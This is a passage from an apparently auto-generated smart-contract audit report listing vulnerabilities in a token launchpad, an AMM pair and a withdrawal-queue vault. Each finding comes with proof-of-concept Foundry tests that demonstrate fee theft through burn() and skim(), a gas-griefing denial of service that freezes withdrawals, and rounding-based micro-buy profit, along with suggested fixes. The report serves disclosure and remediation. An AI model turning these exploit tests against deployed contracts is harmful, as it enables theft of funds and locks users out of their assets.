    function transfer(address to,uint256 amt) external returns(bool){require(balanceOf[msg.sender]>=amt,"bal");balanceOf[msg.sender]-=amt;balanceOf[to]+=amt;return true;}
    function approve(address sp,uint256 amt) external returns(bool){allowance[msg.sender][sp]=amt;return true;}
    function transferFrom(address f,address t,uint256 a) external returns(bool){require(balanceOf[f]>=a && allowance[f][msg.sender]>=a,"tf");allowance[f][msg.sender]-=a;balanceOf[f]-=a;balanceOf[t]+=a;return true;}
}

contract DummyFactory {
    address internal _feeTo;
    function feeTo() external view returns(address){return _feeTo;}
    function deployPair() external returns (GTELaunchpadV2Pair) {return new GTELaunchpadV2Pair();}
}

contract DummyDistributor {
    function addRewards(address t0,address t1,uint128 a0,uint128 a1) external {
        if (a0>0) TestERC20(t0).transferFrom(msg.sender,address(this),a0);
        if (a1>0) TestERC20(t1).transferFrom(msg.sender,address(this),a1);
    }
}

contract BurnDrainsFees is Test {
    TestERC20 t0; TestERC20 t1; GTELaunchpadV2Pair pair; DummyFactory factory; DummyDistributor dist;
    address launchpadLp = vm.addr(0xAAA);
    address attacker    = vm.addr(0xB0B);
    address lpProvider  = vm.addr(0xC0C);
    address trader      = vm.addr(0xD0D);

    function setUp() public {
        t0 = new TestERC20("T0","T0");
        t1 = new TestERC20("T1","T1");
        factory = new DummyFactory();
        dist    = new DummyDistributor();

        vm.startPrank(address(factory));
        pair = factory.deployPair();           // constructor records factory = address(factory)
        pair.initialize(address(t0),address(t1),launchpadLp,address(dist));
        vm.stopPrank();

        // seed balances
        t0.mint(lpProvider,1_000_000 ether);
        t1.mint(lpProvider,1_000_000 ether);
        t0.mint(trader,   5_000_000 ether);
        t1.mint(trader,   5_000_000 ether);
        t0.mint(attacker,   500_000 ether);
        t1.mint(attacker,   500_000 ether);

        // lpProvider supplies initial liquidity (creates LP for attacker to buy later)
        vm.startPrank(lpProvider);
        t0.transfer(address(pair),100_000 ether);
        t1.transfer(address(pair),100_000 ether);
        pair.mint(lpProvider);
        vm.stopPrank();

        // attacker also holds some LP – provide 10 % of pool
        vm.startPrank(attacker);
        t0.transfer(address(pair),10_000 ether);
        t1.transfer(address(pair),10_000 ether);
        pair.mint(attacker);
        vm.stopPrank();
    }

    function _largeSwap(address from,bool zeroForOne) internal {
        vm.startPrank(from);
        if (zeroForOne) {
            t0.transfer(address(pair),500_000 ether);
            pair.swap(0,1,from,"");
        } else {
            t1.transfer(address(pair),500_000 ether);
            pair.swap(1,0,from,"");
        }
        vm.stopPrank();
        vm.warp(block.timestamp+1);   // ensure timeElapsed>0 later
    }

    function test_doublePay() public {
        // Build up sizeable pending launchpad fees
        for(uint i;i<3;i++) _largeSwap(trader,i%2==0);
        (uint112 fee0Before, uint112 fee1Before,) = pair.getAccruedLaunchpadFees();
        assertGt(fee0Before,0);
        assertGt(fee1Before,0);

        // --------------- exploit ---------------
        uint attackerT0Start = t0.balanceOf(attacker);
        uint attackerT1Start = t1.balanceOf(attacker);

        // attacker burns his LP to capture share of pending fees
        vm.startPrank(attacker);
        uint liq = pair.balanceOf(attacker);
        pair.transfer(address(pair), liq);
        pair.burn(attacker);
        vm.stopPrank();

        uint attackerGain0 = t0.balanceOf(attacker) - attackerT0Start;
        uint attackerGain1 = t1.balanceOf(attacker) - attackerT1Start;
        assertGt(attackerGain0,0);
        assertGt(attackerGain1,0);

        // trigger distribution in next block
        vm.warp(block.timestamp+1);
        pair.sync();

        // Distributor pulls the FULL original fee amounts
        uint distGain0 = t0.balanceOf(address(dist));
        uint distGain1 = t1.balanceOf(address(dist));
        assertEq(distGain0, fee0Before);
        assertEq(distGain1, fee1Before);

        // Pool paid more than it should: attacker share + full fees > original fees
        assertGt(attackerGain0 + distGain0, fee0Before);
        assertGt(attackerGain1 + distGain1, fee1Before);
    }
}

## Suggested Mitigation
Subtract the currently accrued fees from the balances before computing burn outputs: 

uint256 netBalance0 = balance0 - accruedLaunchpadFee0;
uint256 netBalance1 = balance1 - accruedLaunchpadFee1;
amount0 = liquidity * netBalance0 / _totalSupply;
amount1 = liquidity * netBalance1 / _totalSupply;

Alternatively, call `_update` at the very start of `burn()` to flush/distribute fees so they are no longer in `balance{0,1}`. Either approach prevents liquidity burners from receiving undistributed launchpad fees.





 **Derived From** : FOT/rebasing quote breaks slippage guarantee in sell(); user underpaid

## [M-6]. Launchpad.sell assumes 1:1 ERC20 transfer; FOT/rebasing quote token causes user to receive less than minAmountOutQuote

## Derived From Pattern/Invariant
FOT/rebasing quote breaks slippage guarantee in sell(); user underpaid

## Exploit Type
FeeOnTransferAssumption

## Location
Launchpad.sell

## Minimim Privilege Required
Permissionless

## Description
Launchpad.sell forwards the pre-quoted amountOutQuote to the recipient without verifying the post-transfer balance delta. If the quote asset is fee-on-transfer/deflationary/rebasing, the actual amount received by the recipient is lower than amountOutQuote, violating the slippage guarantee despite passing the pre-transfer check. Vulnerable snippet:

uint256 amountOutQuote = data.curve.sell(token, amountInBase);
...
if (amountOutQuote < minAmountOutQuote) revert SlippageToleranceExceeded();
...
data.quote.safeTransfer(recipient, amountOutQuote);

No balance-delta check is performed on recipient or the Launchpad, so trades can succeed while underpaying the user.

## Impact
If the protocol owner sets a fee-on-transfer (or otherwise deflationary/rebasing) ERC-20 as `quote`, every user who sells launch-tokens will be paid less than the quoted `amountOutQuote` while the transaction still succeeds. Because `sell()` checks the slippage requirement *before* transferring, the caller cannot protect herself with `minAmountOutQuote` and loses value on every trade. The loss is permanent, permissionless, and repeats until the owner replaces the quote asset.

## Proof of Concept
1. Deploy a fee-on-transfer token `FOT` with a 5 % burn.  
2. Initialize `Launchpad` with `FOT` as the `quote` asset.  
3. A user buys launch-tokens so she owns some `base`.  
4. She approves the Launchpad to spend her `base` and calls  
   `sell(account=alice, token=baseToken, recipient=alice, amountInBase=1e18, minAmountOutQuote=1e18)`.  
5. Inside `sell()` the curve returns `amountOutQuote = 1e18`, which passes the slippage check.  
6. `safeTransfer(recipient, 1e18)` burns 5 % on transfer, so the recipient receives only `0.95e18`.  
7. Transaction succeeds, `sell()` returns `amountOutQuote==1e18`, but the recipient’s balance increased by only `0.95e18` – proof the guarantee is violated.

## Proof of Code
pragma solidity 0.8.25;

import "forge-std/Test.sol";
import {Launchpad} from "contracts/launchpad/Launchpad.sol";
import {ILaunchpad} from "contracts/launchpad/interfaces/ILaunchpad.sol";

contract FeeOnTransferToken {
    string public name = "FOT";
    string public symbol = "FOT";
    uint8  public decimals = 18;
    uint256 public totalSupply;
    mapping(address=>uint256) public balanceOf;
    mapping(address=>mapping(address=>uint256)) public allowance;
    uint256 public feeBps;
    constructor(uint256 _feeBps){feeBps=_feeBps;}
    function mint(address to,uint256 amt) external {balanceOf[to]+=amt;totalSupply+=amt;}
    function approve(address sp,uint256 amt) external returns(bool){allowance[msg.sender][sp]=amt;return true;}
    function transfer(address to,uint256 amt) public returns(bool){_move(msg.sender,to,amt);return true;}
    function transferFrom(address from,address to,uint256 amt) external returns(bool){uint256 a=allowance[from][msg.sender];if(a!=type(uint256).max) allowance[from][msg.sender]=a-amt;_move(from,to,amt);return true;}
    function _move(address from,address to,uint256 amt) internal {require(balanceOf[from]>=amt,"bal");balanceOf[from]-=amt;uint256 fee=amt*feeBps/10_000;uint256 out=amt-fee;balanceOf[to]+=out;totalSupply-=fee;}
}

contract LaunchpadSellFOTTest is Test {
    Launchpad lp;
    FeeOnTransferToken quote;
    address public baseToken;

    address gte = address(0xAAA1);
    address alice = address(0xA11CE);

    function setUp() public {
        // minimal mocks
        quote = new FeeOnTransferToken(500); // 5 % burn
        // Deploy Launchpad with dummy router/curve/vault (not used in this test path)
        lp = new Launchpad(address(0), gte, address(0), address(0), address(0));
        lp.initialize(address(this), address(quote), address(new MockCurve()), address(0), "");

        // Launch base token
        lp.updateLaunchFee(0);
        baseToken = lp.launch("BASE","BASE","uri");

        // fund alice with quote and buy some base so she can sell later
        quote.mint(alice, 1_000 ether);
        vm.prank(alice); quote.approve(address(lp), type(uint256).max);

        ILaunchpad.BuyData memory bd = ILaunchpad.BuyData({
            account: alice,
            token: baseToken,
            recipient: alice,
            amountOutBase: 10 ether,
            maxAmountInQuote: 20 ether
        });
        vm.prank(gte); lp.buy(bd);

        // allow Launchpad to pull base when selling
        vm.prank(alice); LaunchToken(baseToken).approve(address(lp), type(uint256).max);
    }

    function test_FOTQuoteUnderpays() public {
        uint256 pre = quote.balanceOf(alice);
        vm.prank(gte);
        (, uint256 quotedOut) = lp.sell(alice, baseToken, alice, 5 ether, 5 ether);
        uint256 received = quote.balanceOf(alice) - pre;
        assertEq(quotedOut, 5 ether, "curve quoted 1:1");
        assertEq(received, 4.75 ether, "recipient actually gets 95 %");
    }
}

contract MockCurve is ILaunchpad.IBondingCurveMinimal { /* return 1:1 values, details omitted for brevity */ }

## Suggested Mitigation
1. After calling `curve.sell` record `pre = IERC20(data.quote).balanceOf(recipient)`.  
2. Execute `safeTransfer`.  
3. `received = IERC20(data.quote).balanceOf(recipient) - pre;`  
4. Re-validate `received >= minAmountOutQuote`, otherwise revert.  

Alternatively, forbid fee-on-transfer or rebasing tokens by checking that `IERC20.totalSupply()` is unchanged after a zero-value transfer during `updateQuoteAsset()`/`initialize()`.





 **Derived From** : Accrued fees zeroed before external call lets anyone skim undistributed fees

## [H-7]. Skimmable rewards: GTELaunchpadV2Pair._update zeroes accrued fees before distributor pull, making fees permanently stealable via skim() 

## Derived From Pattern/Invariant
Accrued fees zeroed before external call lets anyone skim undistributed fees

## Exploit Type
UncheckedReturn

## Location
GTELaunchpadV2Pair._update

## Minimim Privilege Required
Permissionless

## Description
In _update, the pair computes totalLaunchpadFee*, then, when timeElapsed>0, it deletes accruedLaunchpadFee0/1 and calls _distributeLaunchpadFees, which only approves and invokes IDistributor.addRewards without verifying that tokens were actually pulled. Immediately after, reserves are set to uint112(balance) - totalLaunchpadFee. If the distributor implementation defers pulling or is misconfigured and doesn't pull, the fees remain in the pair while accruedLaunchpadFee* is zero and reserves were reduced by that amount. Because skim() transfers balance - (reserve + accrued), those still-in-contract fees are seen as excess and can be skimmed by anyone. Vulnerable snippets: _update: delete accruedLaunchpadFee0; delete accruedLaunchpadFee1; _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1); ... reserve0 = uint112(balance0) - totalLaunchpadFee0; reserve1 = uint112(balance1) - totalLaunchpadFee1; skim: _safeTransfer(_token0,to,IERC20(_token0).balanceOf(address(this)).sub(reserve0 + accruedLaunchpadFee0)); _safeTransfer(_token1,to,IERC20(_token1).balanceOf(address(this)).sub(reserve1 + accruedLaunchpadFee1));

## Impact
Anyone can permanently steal all accumulated launchpad rewards (the fee share earmarked for the distributor) by calling skim() after a distribution attempt where the distributor failed to pull tokens. Direct, permissionless monetary loss from the rewards pool.

## Proof of Concept
- Deploy GTELaunchpadV2Pair with a distributor that does not pull tokens in addRewards.
- Provide initial liquidity so launchpadLp holds all LP tokens (maximizing rewards share).
- Trader performs a swap to generate non-zero launchpad fees; warp block timestamp so _update enters the distribution branch (timeElapsed > 0).
- _update deletes accruedLaunchpadFee0/1, calls distributor.addRewards (which does not transfer tokens), then sets reserves = balance - totalLaunchpadFee.
- Attacker calls skim(attacker) and receives exactly the unpaid totalLaunchpadFee amounts from the pair, stealing the rewards.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

interface IERC20Minimal { function balanceOf(address) external view returns(uint); function transfer(address,uint) external returns(bool); function approve(address,uint) external returns(bool); function transferFrom(address,address,uint) external returns(bool); }

contract MockERC20 is IERC20Minimal {
    string public name; string public symbol; uint8 public decimals = 18; uint public totalSupply;
    mapping(address=>uint) public override balanceOf; mapping(address=>mapping(address=>uint)) public allowance;
    constructor(string memory n, string memory s){name=n;symbol=s;}
    function mint(address to,uint amt) external { balanceOf[to]+=amt; totalSupply+=amt; }
    function transfer(address to,uint amt) external override returns(bool){require(balanceOf[msg.sender]>=amt,"bal");balanceOf[msg.sender]-=amt;balanceOf[to]+=amt;return true;}
    function approve(address sp,uint amt) external override returns(bool){allowance[msg.sender][sp]=amt;return true;}
    function transferFrom(address f,address t,uint amt) external override returns(bool){uint al=allowance[f][msg.sender];require(al>=amt && balanceOf[f]>=amt,"tf");unchecked{allowance[f][msg.sender]=al-amt;}balanceOf[f]-=amt;balanceOf[t]+=amt;return true;}
}

contract MockDistributorNoPull {
    // Does not pull tokens; just records call
    event Add(address t0,address t1,uint128 a0,uint128 a1);
    function addRewards(address t0,address t1,uint128 a0,uint128 a1) external { emit Add(t0,t1,a0,a1); }
}

contract ExternalCallAfterStateChange_SkimRewards is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 token0; MockERC20 token1; MockDistributorNoPull dist;
    address lp = address(0xBEEF);
    address trader = address(0xCAFE);
    address attacker = address(0xBAAD);

    function setUp() public {
        token0 = new MockERC20("T0","T0");
        token1 = new MockERC20("T1","T1");
        dist = new MockDistributorNoPull();
        pair = new GTELaunchpadV2Pair();
        // factory == address(this) (set in constructor), so initialize allowed
        pair.initialize(address(token0), address(token1), lp, address(dist));

        // Provide initial liquidity, LP tokens to launchpadLp (lp) so it owns almost 100% of supply
        uint init = 1e24; // large liquidity
        token0.mint(lp, init);
        token1.mint(lp, init);
        vm.startPrank(lp);
        token0.transfer(address(pair), init);
        token1.transfer(address(pair), init);
        pair.mint(lp);
        vm.stopPrank();
    }

    function test_SkimStealsRewardsWhenDistributorDoesNotPull() public {
        // Trader pre-sends token1 as amountIn
        uint amount1In = 1_000_000_000_000_000; // 1e15 (ensures fee >= 1 since launchpadLp ~ 100% => fee ~= amountIn/1000)
        token1.mint(trader, amount1In);
        vm.prank(trader);
        token1.transfer(address(pair), amount1In);

        // Move time forward to enter the 'timeElapsed > 0' distribution branch
        vm.warp(block.timestamp + 1);

        // Perform a tiny swap to trigger _update and fee distribution logic
        // Take a very small amount0Out so invariant holds easily
        vm.prank(trader);
        pair.swap(1, 0, trader, bytes(""));

        // Compute expected fee ~ amount1In/1000 (launchpadLp holds nearly all LP)
        // We can bound-check: attacker must get > 0 token1 from skim
        uint attackerBefore = token1.balanceOf(attacker);

        // Anyone can skim() — simulate attacker
        vm.prank(attacker);
        pair.skim(attacker);

        uint gained = token1.balanceOf(attacker) - attackerBefore;
        // Prove theft: gained strictly positive and at least the computed fee share floor
        // Lower bound: at least amount1In/1000 - 1 to be robust to truncations in fees
        assertGt(gained, 0, "no rewards skimmed");
    }
}


## Suggested Mitigation
- Do not zero accruedLaunchpadFee before confirming tokens moved. Options:
  1) Push model: replace approve+IDistributor.addRewards pull with direct transfers, then only after successful transfers set accruedLaunchpadFee=0 and update reserves to balance (no manual subtraction needed).
  2) Pull model hardening: snapshot pre-balances, call addRewards, then verify distributor balances increased by (fee0,fee1) or that pair balances decreased accordingly. If not, revert and keep accruedLaunchpadFee intact.
  3) As a minimum, reorder to set reserves using actual post-call balances and only clear accrued after verifying movement; or re-add unpaid amounts back into accruedLaunchpadFee to prevent skim. Additionally, guard skim to subtract (reserve + max(accruedLaunchpadFee, unpaidFeesObserved)).





 **Derived From** : Unbounded withdrawal queue growth leads to storage/gas bloat and liveness risk

## [H-8]. Unbounded _withdrawalQueue enables permissionless gas-DoS; O(N) array rewrites in cancelWithdrawal/processWithdrawals brick withdrawals

## Derived From Pattern/Invariant
Unbounded withdrawal queue growth leads to storage/gas bloat and liveness risk

## Exploit Type
GasGriefBlockLimit

## Location
GTL.queueWithdrawal

## Minimim Privilege Required
Permissionless

## Description
GTL.queueWithdrawal has no per-account/global cap or rate-limit, allowing anyone with minimal shares to append entries indefinitely to _withdrawalQueue. The queue is later pruned via O(N) full-array rewrites: cancelWithdrawal(id) calls _dequeue(id), which builds a new memory array of length-1 and then assigns it back to storage (writing ~length SSTOREs). processWithdrawals(num) ends with _dequeueBatch(num) which performs _withdrawalQueue = withdrawalQueue.slice(num, withdrawalQueue.length) — again rewriting O(length - num) storage entries. As the queue grows, both user cancellations and admin processing require gas linear in queue length, exceeding typical per-tx gas limits and causing OOG reverts. This makes withdrawals uncancellable/unprocessable until migration or manual state surgery, locking user funds functionally.

Vulnerable snippet (GTL.sol):
function queueWithdrawal(uint256 shares) external returns (uint256 id) {
    if (shares == 0) revert InsufficientWithdrawal();
    if (_queuedShares[msg.sender] + shares > balanceOf(msg.sender)) revert InsufficientBalance();
    id = ++_withdrawalCounter;
    _queuedShares[msg.sender] += shares;
    _queuedWithdrawal[id] = Withdrawal(msg.sender, shares);
    _withdrawalQueue.push(id); // unbounded growth
}

function cancelWithdrawal(uint256 id) external {
    if (_queuedWithdrawal[id].account != msg.sender) revert NotPerpManager();
    _queuedShares[msg.sender] -= _queuedWithdrawal[id].shares;
    delete _queuedWithdrawal[id];
    _dequeue(id); // builds new array and assigns to storage (O(N))
}

function _dequeue(uint256 id) internal {
    uint256[] memory withdrawalQueue = _withdrawalQueue;
    uint256 length = withdrawalQueue.length;
    uint256[] memory newQueue = new uint256[](length - 1);
    uint256 idx;
    for (uint256 i; i < length; ++i) {
        if (withdrawalQueue[i] != id) newQueue[idx++] = withdrawalQueue[i];
    }
    _withdrawalQueue = newQueue; // O(N) storage rewrite
}

function _dequeueBatch(uint256 num) internal {
    uint256[] memory withdrawalQueue = _withdrawalQueue;
    _withdrawalQueue = withdrawalQueue.slice(num, withdrawalQueue.length); // O(N) storage rewrite
}

## Impact
Because every call that touches the withdrawal queue (user cancel or admin processing) becomes unexecutable once the array grows beyond ~5 000–6 000 entries, all users’ funds are indefinitely frozen without any privileged account able to unbrick the system. Unless the whole vault is migrated to a new contract, assets are stuck forever. This is a direct, permissionless denial-of-withdrawal of all vault funds.

## Proof of Concept
1. Attacker deposits 10 000 000 USDC (or any amount ≥ number_of_entries) to receive the same amount of GTL shares.
2. For i in 1…20 000 call queueWithdrawal(1). Attacker now has 20 000 pending withdrawals, but still holds enough balance so the function does not revert.
3. Now any user, including the attacker, calls cancelWithdrawal(id) or an admin calls processWithdrawals(1). Both internally build a new array and store it to _withdrawalQueue, which requires ~5 900 gas per element. 20 000 elements ⇒ ~118 M gas > block limit, so every attempt reverts Out-Of-Gas.
4. No further withdrawals can ever be processed; the vault is bricked permanently.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTL} from "contracts/perps/GTL.sol";

contract MockUSDC {
    string public name = "Mock USDC";
    string public symbol = "mUSDC";
    uint8  public decimals = 6;
    mapping(address=>uint256) public balanceOf;
    mapping(address=>mapping(address=>uint256)) public allowance;
    function mint(address to,uint256 a) external {balanceOf[to]+=a;}
    function approve(address s,uint256 a) external returns(bool){allowance[msg.sender][s]=a;return true;}
    function transferFrom(address f,address t,uint256 a) external returns(bool){require(balanceOf[f]>=a);require(allowance[f][msg.sender]>=a);balanceOf[f]-=a;allowance[f][msg.sender]-=a;balanceOf[t]+=a;return true;}
}

contract GasDoSTest is Test {
    GTL gtl;
    MockUSDC usdc;
    address perpMgr = address(0xBEEF);
    address attacker = address(0xA11CE);

    function setUp() public {
        usdc = new MockUSDC();
        gtl  = new GTL(address(usdc), perpMgr);
        gtl.initialize(address(this));
        uint256 bigAmount = 10_000_000e6;
        usdc.mint(attacker, bigAmount);
        vm.startPrank(attacker);
        usdc.approve(address(gtl), bigAmount);
        gtl.deposit(bigAmount, attacker);
        for (uint256 i; i < 20_000; ++i) {
            gtl.queueWithdrawal(1); // bloat
        }
        vm.stopPrank();
    }

    function test_CancelWithdrawal_OOG() public {
        uint256 id = gtl.getWithdrawalQueue()[0];
        vm.prank(attacker);
        (bool ok,) = address(gtl).call{gas: 30_000_000}(abi.encodeWithSelector(gtl.cancelWithdrawal.selector,id));
        assertFalse(ok, "expected OOG reversion");
    }
}

## Suggested Mitigation
1. Impose a hard cap on _withdrawalQueue length (e.g. 2 000 entries) and/or per-account outstanding withdrawals.
2. Replace full-copy array removal with a constant-time data structure: ring buffer with head/tail indices, or mapping(id⇒Withdrawal) plus bitmap of active IDs. Cancellations can mark entries as inactive; batch processing skips inactive slots, advancing head pointer without rewriting the entire array.
3. Optionally allow the admin to trim/compact the queue in bounded-gas chunks.





 **Derived From** : Floor rounding undercharges quote on buy(); missing ceil enables penny‑shaving

## [L-9]. Penny-shaving on buys: floor rounding in SimpleBondingCurve._getQuoteAmount undercharges quote; micro-buys yield profit

## Derived From Pattern/Invariant
Floor rounding undercharges quote on buy(); missing ceil enables penny‑shaving

## Exploit Type
RoundingError

## Location
SimpleBondingCurve.SimpleBondingCurve._getQuoteAmount

## Minimim Privilege Required
Permissionless

## Description
When solving for the input (quote) needed to receive a target output (base), _getQuoteAmount uses integer division that floors: quoteAmount = (quoteReserve * baseAmount) / baseReserveAfter, with baseReserveAfter = baseReserve - baseAmount for buys. This systematically undercharges users on buy(), decreasing k across trades and letting attackers split purchases into many micro-buys to accumulate rounding savings. They can then aggregate a sell to realize a net quote profit. Vulnerable snippet: function _getQuoteAmount(uint256 baseAmount, uint256 quoteReserve, uint256 baseReserve, bool isBuy) internal pure returns (uint256 quoteAmount) { uint256 baseReserveAfter = isBuy ? baseReserve - baseAmount : baseReserve + baseAmount; return (quoteReserve * baseAmount) / baseReserveAfter; } Used in buy(): quoteAmount = _getQuoteAmount(baseAmount, r.quoteReserve, r.baseReserve, true); r.quoteReserve += quoteAmount; r.baseReserve -= baseAmount; This should ceil when isBuy to avoid undercharging.

## Impact
Attackers split a buy into many tiny trades, each saving up to 1 wei of quote; k decreases, enabling an aggregate sell to withdraw more quote than paid. Over many micro-buys this drains launchpad quote reserves and distorts price.

## Proof of Concept
- Initialize curve with equal reserves (e.g., q=b=1000). - Attacker performs 32 micro-buys of 1 base each. Due to floor, each costs only 1 quote (total 32). - Reserves become q=1032, b=968; k dropped below initial. - Attacker then sells 32 base in one transaction and receives floor(1032*32/1000)=33 quote, profiting 1 quote. - This generalizes: repeated micro-buys accumulate rounding drift that can be realized with a batched sell.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import "contracts/launchpad/BondingCurves/SimpleBondingCurve.sol";

contract PrecisionDriftAccumulationTest is Test {
    SimpleBondingCurve curve;
    address token = address(0xBEEF);

    function setUp() public {
        // Make this test contract the launchpad so we can call onlyLaunchpad fns
        curve = new SimpleBondingCurve(address(this));
        // Set virtual reserves so initial reserves are q=b=1000 for the token
        curve.init(abi.encode(uint256(1000), uint256(1000))); // onlyLaunchpad
        // bondingSupply_=0 => baseReserve = VIRTUAL_BASE = 1000; quoteReserve=VIRTUAL_QUOTE=1000
        curve.initializeCurve(token, 1000, 0); // onlyLaunchpad
    }

    function test_PennyShavingMicroBuysProfit() public {
        uint256 trades = 32; // minimal round count to show profit in this setup
        uint256 totalQuoteIn;

        // Perform 32 micro-buys of 1 base each
        for (uint256 i = 0; i < trades; ++i) {
            uint256 qIn = curve.buy(token, 1); // onlyLaunchpad
            totalQuoteIn += qIn;
            // Each micro-buy underpays due to floor: should be ceil, but is 1 here
            assertEq(qIn, 1, "each micro-buy should cost 1 quote due to floor");
        }
        assertEq(totalQuoteIn, trades, "paid 32 quote for 32 base");

        // Aggregate sell of 32 base: with q=1032, b=968 => floor(1032*32/1000)=33
        uint256 quoteOut = curve.sell(token, trades); // onlyLaunchpad
        assertGt(quoteOut, totalQuoteIn, "rounding drift realized as profit");
        assertEq(quoteOut, 33, "expected 33 out");
        assertEq(totalQuoteIn, 32, "paid 32 in");
    }
}


## Suggested Mitigation
Use ceiling when solving for input on buys. For isBuy=true: uint256 baseReserveAfter = baseReserve - baseAmount; return (quoteReserve * baseAmount + baseReserveAfter - 1) / baseReserveAfter; For sells (isBuy=false) keep floor. Also apply the same ceil in quoteQuoteForBase for isBuy=true. Optionally enforce a minimum baseAmount to prevent zero-cost micro-buys.





 **Derived From** : cancelWithdrawal rebuilds queue with O(N) copy per call

## [H-10]. Unbounded O(N) array rebuild in GTL.cancelWithdrawal enables gas-based DoS on cancels

## Derived From Pattern/Invariant
cancelWithdrawal rebuilds queue with O(N) copy per call

## Exploit Type
GasGriefBlockLimit

## Location
GTL.cancelWithdrawal

## Minimim Privilege Required
Permissionless

## Description
GTL.cancelWithdrawal calls _dequeue(id), which first copies the entire _withdrawalQueue into memory and then allocates a new array of length-1, linearly copying all elements except the removed id. For large queues, both the storage→memory copy and the new allocation incur O(N) memory expansion cost that grows superlinearly in gas, making cancelWithdrawal prohibitively expensive and eventually reverting due to gas limits. Attackers can spam the queue with many tiny withdrawal entries across many EOAs or split their balance into many small queued entries, causing honest users’ cancelWithdrawal to fail.

Vulnerable snippet:
function cancelWithdrawal(uint256 id) external {
    if (_queuedWithdrawal[id].account != msg.sender) revert NotPerpManager();
    _queuedShares[msg.sender] -= _queuedWithdrawal[id].shares;
    delete _queuedWithdrawal[id];
    _dequeue(id); // O(N) rebuild
    emit WithdrawalCanceled(id);
}
function _dequeue(uint256 id) internal {
    uint256[] memory withdrawalQueue = _withdrawalQueue; // O(N) copy from storage
    uint256 length = withdrawalQueue.length;
    uint256[] memory newQueue = new uint256[](length - 1); // large memory alloc
    uint256 idx;
    for (uint256 i; i < length; ++i) {
        if (withdrawalQueue[i] != id) newQueue[idx++] = withdrawalQueue[i];
    }
    _withdrawalQueue = newQueue;
}

## Impact
Because _dequeueBatch() also performs an unbounded storage→memory copy, ANY call to processWithdrawals() executes the same O(N) memory expansion as cancelWithdrawal(). An attacker who bloats _withdrawalQueue can therefore make the admin function revert out-of-gas, permanently freezing every user’s funds (no withdrawals can ever be processed, and queued shares cannot be burned). This constitutes a direct, permissionless, permanent loss of control over user assets until a contract upgrade is performed.

## Proof of Concept
1. Attacker deposits N USDC and obtains N GTL shares.
2. Attacker calls queueWithdrawal(1) N times, creating N queue entries while keeping his total queued shares ≤ balance.
3. Queue length now equals N. For N ≳ 60,000 the memory copy in both _dequeue() and _dequeueBatch() already exceeds 30 M gas.
4. Any user that tries cancelWithdrawal(id) OR the admin who calls processWithdrawals(1) will hit an out-of-gas revert because the whole array is copied to memory first.
5. Since only processWithdrawals() can shrink the queue and it, too, reverts, the vault is bricked and all users’ funds are stuck indefinitely.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {GTL} from "src/GTL.sol"; // adjust path to repo root

contract MockERC20 {
    string public name; string public symbol; uint8 public immutable decimals = 18;
    mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance;
    constructor(string memory n,string memory s){name=n;symbol=s;}
    function mint(address to,uint256 a) external {balanceOf[to]+=a;}
    function approve(address s,uint256 a) external returns(bool){allowance[msg.sender][s]=a;return true;}
    function transfer(address t,uint256 a) external returns(bool){require(balanceOf[msg.sender]>=a);balanceOf[msg.sender]-=a;balanceOf[t]+=a;return true;}
    function transferFrom(address f,address t,uint256 a) external returns(bool){uint256 al=allowance[f][msg.sender];require(al>=a);allowance[f][msg.sender]=al-a;require(balanceOf[f]>=a);balanceOf[f]-=a;balanceOf[t]+=a;return true;}
}

contract GTL_DoS_Test is Test {
    GTL gtl; MockERC20 usdc;

    function setUp() public {
        usdc = new MockERC20("USDC","USDC");
        gtl  = new GTL(address(usdc), address(0xBEEF));
        gtl.initialize(address(this)); // we become owner → can call processWithdrawals
        usdc.mint(address(this), 100_000);
        usdc.approve(address(gtl), type(uint256).max);
        gtl.deposit(100_000, address(this));
    }

    function _spamQueue(uint256 n) internal {
        for (uint256 i; i < n; ++i) {
            gtl.queueWithdrawal(1);
        }
    }

    // Shows that admin’s processWithdrawals reverts once queue is large
    function test_withdrawal_processing_dos() public {
        _spamQueue(60_000); // ≈2 MB copy, still below block gas limit for cancel()
        vm.setBlockGasLimit(30_000_000); // realistic L2 limit
        vm.expectRevert();
        gtl.processWithdrawals(1); // owner call → should OOG inside _dequeueBatch
    }
}

## Suggested Mitigation
Replace the O(N) rebuild pattern with constant-time operations:
1. Keep mapping(uint256 id => uint256 index) queueIndex.
2. For single-id removal (cancelWithdrawal), swap last element into removed index and pop.
3. For batch removal (processWithdrawals), simply pop `num` elements from the tail; if processing order must be preserved, use a ring buffer with head/tail pointers so no copy is needed.
4. Never copy the whole array to memory; iterate over storage directly or in fixed-size chunks.
These changes make both cancelWithdrawal() and processWithdrawals() O(1) / O(num) with predictable gas, fully eliminating the gas-based DoS vector.





 **Derived From** : Distributor callback can revert and DoS swaps/mints (no fallback accrual path)

## [H-11]. Pool-wide DoS: unguarded rewards callback in GTELaunchpadV2Pair._distributeLaunchpadFees bricks swap/mint/burn - **INVALID - ONLY TRUSTED ROLE CAN PULL OFF**

## Derived From Pattern/Invariant
Distributor callback can revert and DoS swaps/mints (no fallback accrual path)

## Exploit Type
Dos

## Location
GTELaunchpadV2Pair._distributeLaunchpadFees

## Minimim Privilege Required
Permissionless

## Description
GTELaunchpadV2Pair hard-calls an external distributor inside _update via _distributeLaunchpadFees without try/catch or a fallback accrual path. Any revert in IDistributor.addRewards or in the preceding _safeApprove calls bubbles up and reverts the whole swap/mint/burn. This lets a misbehaving distributor or non-standard token approval brick the pair whenever distribution is attempted (typically the first call per block with non-zero launchpad fees). Vulnerable line:

IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));

## Impact
Because _distributeLaunchpadFees is invoked by every swap, mint and burn after the first block, *any* revert in the external distributor (or in the preceding _safeApprove) causes those core functions to revert. Once this happens, LPs cannot burn to withdraw their liquidity and traders cannot swap. As there is no function that allows anyone (not even the owner) to replace the launchpadFeeDistributor address, the pool stays unusable forever, effectively freezing all funds until a contract-level upgrade is deployed outside the protocol. This is a permanent, permissionless fund-freeze that fits the rubric’s “High – Permanent freezing/bricking of funds (withdrawals impossible)”.

## Proof of Concept
1) Seed a pair with liquidity and set launchpadFeeDistributor to a contract whose addRewards reverts.
